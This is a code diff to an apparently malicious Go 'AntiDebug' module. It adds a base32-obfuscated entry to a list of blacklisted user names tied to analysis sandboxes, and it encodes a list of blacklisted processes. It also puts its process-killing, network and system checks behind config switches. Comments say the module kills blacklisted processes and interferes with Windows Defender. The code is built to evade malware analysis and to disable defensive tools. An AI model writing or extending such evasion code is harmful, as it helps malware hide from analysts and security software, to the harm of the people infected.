@@ -40,6 +40,7 @@ type AntiDebug struct {
 
 func NewAntiDebug() *AntiDebug {
 	blackListedUsers := []string{
+		"IFSG22LONFZXI4TBORXXE===",
 		"K5CECR2VORUWY2LUPFAWGY3POVXHI===",
 		"IFRGE6I=",
 		"NBWWC4TD",
@@ -433,25 +434,31 @@ func NewAntiDebug() *AntiDebug {
 		blackListedHWIDS:     decodeList(blackListedHWIDS),
 		blackListedIPS:       decodeList(blackListedIPS),
 		blackListedMacs:      decodeList(blackListedMacs),
-		blacklistedProcesses: blacklistedProcesses, //currnetly breaks windows defender
+		blacklistedProcesses: decodeList(blacklistedProcesses),
 	}
 }
 
-func (ad *AntiDebug) checks() bool {
+func (ad *AntiDebug) checks(config Config) bool {
 	debugging := false
 
-	ad.checkProcess()
-	if ad.getNetwork() {
-		debugging = true
+	if config.CheckProcess {
+		ad.checkProcess()
 	}
-	if ad.getSystem() {
-		debugging = true
+
+	if config.Checknetwork {
+		if ad.getNetwork() {
+			debugging = true
+		}
+	}
+	if config.CheckSystem {
+		if ad.getSystem() {
+			debugging = true
+		}
 	}
 
 	return debugging
 }
 
-// checkProcess now uses gopsutil to iterate through processes and kill blacklisted ones.
 func (ad *AntiDebug) checkProcess() {
 	procs, err := process.Processes()
 	if err != nil {
